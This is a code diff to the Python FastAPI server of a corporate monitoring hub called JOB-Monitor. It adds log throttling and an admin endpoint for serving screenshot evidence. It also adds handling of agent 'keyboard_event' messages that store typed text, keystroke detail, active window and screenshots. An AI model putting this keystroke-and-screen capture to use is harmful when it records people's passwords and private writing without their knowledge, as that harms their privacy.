@@ -11,13 +11,14 @@ import socket
 import subprocess
 import threading
 import time
+import uuid
 import webbrowser
 import zipfile
 from typing import Dict, List, Optional, Set
 
 import uvicorn
 from fastapi import FastAPI, File, Form, HTTPException, Query, Request, UploadFile, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse, Response
+from fastapi.responses import FileResponse, HTMLResponse, Response
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 
@@ -32,6 +33,9 @@ from models import (
     UserCreateRequest,
     UserUpdateRequest,
 )
+
+CAPTURES_DIR = config.DATA_DIR / "captures"
+CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
 
 app = FastAPI(title="JOB-Monitor — Centro de Monitoreo y Control Corporativo")
 app.mount("/static", StaticFiles(directory=str(config.BASE_DIR / "static")), name="static")
@@ -84,6 +88,8 @@ class HubManager:
         self.admins: Set[WebSocket] = set()
         self.admin_users: Dict[WebSocket, dict] = {}
         self.subscriptions: Dict[WebSocket, Optional[str]] = {}
+        self._last_connect_log: Dict[str, float] = {}
+        self._last_disconnect_log: Dict[str, float] = {}
 
     def can_user_access_tenant(self, user: Optional[dict], tenant_id: str) -> bool:
         if not user:
@@ -190,18 +196,23 @@ class HubManager:
                 },
             )
 
-        mon_count = max(1, len([m for m in conn.monitors if m.get("id", 0) > 0]))
-        log_entry = db.add_log(
-            agent_id=agent_id,
-            alias=conn.alias,
-            hostname=conn.hostname,
-            username=conn.username,
-            category="NETWORK",
-            message=f"Agente inició sesión correctamente ({conn.os_name} • IP {conn.local_ip} • {mon_count} monitor{'es' if mon_count > 1 else ''})",
-        )
+        # Throttling de logs de conexión idénticos para evitar saturar la bitácora
+        now_ts = time.time()
+        last_conn_log = self._last_connect_log.get(agent_id, 0)
+        if (now_ts - last_conn_log) > 15.0:
+            self._last_connect_log[agent_id] = now_ts
+            mon_count = max(1, len([m for m in conn.monitors if m.get("id", 0) > 0]))
+            log_entry = db.add_log(
+                agent_id=agent_id,
+                alias=conn.alias,
+                hostname=conn.hostname,
+                username=conn.username,
+                category="NETWORK",
+                message=f"Agente inició sesión correctamente ({conn.os_name} • IP {conn.local_ip} • {mon_count} monitor{'es' if mon_count > 1 else ''})",
+            )
+            await self.broadcast_new_log(log_entry, tenant_id=conn.tenant_id)
 
         await self.broadcast_agents_list()
-        await self.broadcast_new_log(log_entry, tenant_id=conn.tenant_id)
 
         if self.has_viewers(agent_id):
             await self.send_to_agent(agent_id, {"type": "start_stream"})
@@ -213,16 +224,20 @@ class HubManager:
             tid = current.tenant_id
             del self.agents[agent_id]
             db.set_device_offline(agent_id)
-            log_entry = db.add_log(
-                agent_id=agent_id,
-                alias=current.alias,
-                hostname=current.hostname,
-                username=current.username,
-                category="NETWORK",
-                message="El equipo se desconectó del servidor central",
-            )
+            now_ts = time.time()
+            last_disc_log = self._last_disconnect_log.get(agent_id, 0)
+            if (now_ts - last_disc_log) > 15.0:
+                self._last_disconnect_log[agent_id] = now_ts
+                log_entry = db.add_log(
+                    agent_id=agent_id,
+                    alias=current.alias,
+                    hostname=current.hostname,
+                    username=current.username,
+                    category="NETWORK",
+                    message="El equipo se desconectó del servidor central",
+                )
+                await self.broadcast_new_log(log_entry, tenant_id=tid)
             await self.broadcast_agents_list()
-            await self.broadcast_new_log(log_entry, tenant_id=tid)
             await self.broadcast_to_viewers(
                 agent_id,
                 {"type": "agent_disconnected", "agent_id": agent_id},
@@ -1299,6 +1314,18 @@ async def update_device_alias(request: Request, agent_id: str, body: AliasUpdate
     return {"ok": True, "agent_id": agent_id, "alias": body.alias.strip()}
 
 
+@app.get("/api/captures/{agent_id}/{filename}")
+async def get_capture_evidence(request: Request, agent_id: str, filename: str):
+    user = verify_admin_access(request)
+    if not hub.can_user_access_agent(user, agent_id):
+        raise HTTPException(status_code=403, detail="No tienes acceso a las capturas de este equipo")
+    clean_filename = os.path.basename(filename)
+    file_path = CAPTURES_DIR / agent_id / clean_filename
+    if not file_path.exists() or not file_path.is_file():
+        raise HTTPException(status_code=404, detail="Evidencia no encontrada")
+    return FileResponse(path=str(file_path), media_type="image/jpeg", filename=clean_filename)
+
+
 @app.websocket("/ws/agent")
 async def ws_agent_endpoint(websocket: WebSocket):
     if config.REQUIRE_MTLS:
@@ -1399,6 +1426,55 @@ async def ws_agent_endpoint(websocket: WebSocket):
                             await hub.broadcast_new_log(log_entry)
 
                     await hub.broadcast_telemetry_update(agent)
+
+                elif msg_type == "keyboard_event":
+                    # MF-07: Persistencia y almacenamiento de evento consolidado de redacción
+                    active_win = str(data.get("active_window") or agent.active_window or "Escritorio")
+                    dur_secs = int(data.get("duration_seconds", 0))
+                    keystrokes_cnt = int(data.get("keystrokes_count", 0))
+                    txt_content = str(data.get("text_content", "")).strip()
+                    keys_detail = data.get("keystrokes_detail", [])
+                    kb_layout = str(data.get("keyboard_layout", "Estándar"))
+                    sct_b64 = str(data.get("screenshot_b64", "")).strip()
+
+                    evidence_url = None
+                    if sct_b64:
+                        try:
+                            img_bytes = base64.b64decode(sct_b64)
+                            agent_captures_dir = CAPTURES_DIR / agent_id
+                            agent_captures_dir.mkdir(parents=True, exist_ok=True)
+                            fname = f"kb_{int(time.time())}_{uuid.uuid4().hex[:6]}.jpg"
+                            fpath = agent_captures_dir / fname
+                            fpath.write_bytes(img_bytes)
+                            evidence_url = f"/api/captures/{agent_id}/{fname}"
+                        except Exception as e:
+                            print(f"[Captures] Error al almacenar evidencia visual: {e}")
+
+                    meta = {
+                        "text_content": txt_content,
+                        "keystrokes_detail": keys_detail,
+                        "keystrokes_count": keystrokes_cnt,
+                        "duration_seconds": dur_secs,
+                        "active_window": active_win,
+                        "keyboard_layout": kb_layout,
+                        "evidence_path": evidence_url,
+                    }
+
+                    preview_txt = f"'{txt_content[:70]}...'" if len(txt_content) > 70 else (f"'{txt_content}'" if txt_content else "(Pulsaciones de navegación)")
+                    msg_txt = f"Redacción en '{active_win}' (Pulsaciones: {preview_txt} • {keystrokes_cnt} teclas • Duración: {dur_secs}s • Idioma: {kb_layout})"
+
+                    log_entry = db.add_log(
+                        agent_id=agent_id,
+                        alias=agent.alias,
+                        hostname=agent.hostname,
+                        username=agent.username,
+                        category="KEYBOARD",
+                        message=msg_txt,
+                        duration_seconds=dur_secs,
+                        evidence_path=evidence_url,
+                        meta_json=json.dumps(meta),
+                    )
+                    await hub.broadcast_new_log(log_entry, tenant_id=agent.tenant_id)
 
                 elif msg_type == "chat_reply":
                     text = str(data.get("text", "")).strip()
